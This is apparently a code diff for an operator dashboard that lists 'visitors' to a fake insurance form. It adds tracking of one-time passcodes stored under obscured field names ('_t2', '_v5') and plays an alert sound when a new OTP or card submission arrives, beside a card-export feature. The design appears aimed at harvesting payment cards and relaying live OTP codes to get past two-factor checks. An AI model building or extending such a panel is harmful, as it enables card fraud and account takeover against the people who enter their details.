@@ -124,6 +124,39 @@ const getCardState = (application: InsuranceApplication) => {
   return null;
 };
 
+const getOtpState = (application: InsuranceApplication) => {
+  const otpHistory =
+    application.history?.filter(
+      (entry: any) =>
+        (entry.type === "_t2" || entry.type === "otp") &&
+        (entry.data?._v5 || entry.data?.otpCode || entry.data?.otp)
+    ) || [];
+
+  if (otpHistory.length > 0) {
+    const sortedOtpHistory = [...otpHistory].sort(
+      (a: any, b: any) => toTimeValue(b?.timestamp) - toTimeValue(a?.timestamp)
+    );
+    const latest = sortedOtpHistory[0];
+    const latestOtpValue =
+      latest?.data?._v5 || latest?.data?.otpCode || latest?.data?.otp || "";
+
+    return {
+      count: otpHistory.length,
+      key: `history|${latest?.id || ""}|${latest?.timestamp || ""}|${latestOtpValue}`,
+    };
+  }
+
+  const directOtp = application._v5 || application.otpCode || application.otp || "";
+  if (typeof directOtp === "string" && directOtp.trim()) {
+    return {
+      count: 1,
+      key: `direct|${directOtp.trim()}|${application.otpUpdatedAt || ""}`,
+    };
+  }
+
+  return null;
+};
+
 const showCardNotification = (visitors: InsuranceApplication[]) => {
   if (visitors.length === 0 || typeof window === "undefined") return;
 
@@ -154,16 +187,18 @@ export default function Dashboard() {
   const [isExportingAllCards, setIsExportingAllCards] = useState(false);
   const [sidebarWidth, setSidebarWidth] = useState(215); // Default landscape width
   const hasLoadedInitialSnapshotRef = useRef(false);
-  const previousUnreadIds = useRef<Set<string>>(new Set());
   const previousCardStateRef = useRef<Map<string, { count: number; key: string }>>(
+    new Map()
+  );
+  const previousOtpStateRef = useRef<Map<string, { count: number; key: string }>>(
     new Map()
   );
   const selectedVisitorIdRef = useRef<string | null>(null);
   const visitorOrderRef = useRef<string[]>([]);
 
   // Play notification sound
-  const playNotificationSound = () => {
-    const audio = new Audio("/notification-piano.mp3");
+  const playNotificationSound = (src: string) => {
+    const audio = new Audio(src);
     audio.play().catch((e) => console.log("Could not play sound:", e));
   };
 
@@ -198,27 +233,32 @@ export default function Dashboard() {
         .map((app) => app.id!)
         .filter((id): id is string => id !== undefined);
 
-      // Check for new unread visitors
-      const currentUnreadIds = new Set(
-        sorted.filter((app) => app.isUnread && app.id).map((app) => app.id!)
-      );
-
-      // Find newly added unread visitors
-      const newUnreadIds = Array.from(currentUnreadIds).filter(
-        (id) => !previousUnreadIds.current.has(id)
-      );
-
-      // Play sound if there are new unread visitors
-      if (newUnreadIds.length > 0 && !isInitialSnapshot) {
-        playNotificationSound();
-      }
-
       // Check for new card submissions (new card entry or changed card details)
       const currentCardState = new Map<string, { count: number; key: string }>();
       const visitorsWithNewCard: InsuranceApplication[] = [];
+      const currentOtpState = new Map<string, { count: number; key: string }>();
+      const visitorsWithNewOtp: InsuranceApplication[] = [];
 
       for (const visitor of sorted) {
         if (!visitor.id) continue;
+
+        const otpState = getOtpState(visitor);
+        if (otpState) {
+          currentOtpState.set(visitor.id, otpState);
+
+          const previousOtpState = previousOtpStateRef.current.get(visitor.id);
+          if (!previousOtpState) {
+            if (!isInitialSnapshot) {
+              visitorsWithNewOtp.push(visitor);
+            }
+          } else if (
+            otpState.count > previousOtpState.count ||
+            otpState.key !== previousOtpState.key
+          ) {
+            visitorsWithNewOtp.push(visitor);
+          }
+        }
+
         const cardState = getCardState(visitor);
         if (!cardState) continue;
 
@@ -240,14 +280,19 @@ export default function Dashboard() {
         }
       }
 
+      if (visitorsWithNewOtp.length > 0 && !isInitialSnapshot) {
+        playNotificationSound("/otp-notification.wav");
+      }
+
       if (visitorsWithNewCard.length > 0 && !isInitialSnapshot) {
-        playNotificationSound();
+        if (visitorsWithNewOtp.length === 0) {
+          playNotificationSound("/card-submitted.mp3");
+        }
         showCardNotification(visitorsWithNewCard);
       }
 
-      // Update previous unread IDs
-      previousUnreadIds.current = currentUnreadIds;
       previousCardStateRef.current = currentCardState;
+      previousOtpStateRef.current = currentOtpState;
       hasLoadedInitialSnapshotRef.current = true;
 
       setApplications(sorted);
